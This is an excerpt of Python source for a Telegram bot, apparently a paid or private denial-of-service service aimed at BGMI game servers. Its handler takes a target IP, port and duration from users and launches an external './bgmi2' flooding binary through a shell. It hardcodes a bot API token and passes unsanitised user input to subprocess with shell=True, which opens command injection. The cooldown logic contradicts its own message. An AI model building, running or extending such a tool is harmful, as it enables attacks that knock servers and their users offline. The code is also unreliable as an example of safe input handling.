...
bot = telebot.TeleBot('7449578611:AAFAUJSkoVuGYEi4APNAPMslBjChZg6Q4ZI')
...
def handle_bgmi(message):
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
                response = "You Are On Cooldown. Please Wait 1min Before Running The /bgmi2 Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 181:
                ...
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi2 {target} {port} {time} 180"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
        else:
...
Contact Information: @HackerBolte
'''
    bot.reply_to(message, response)
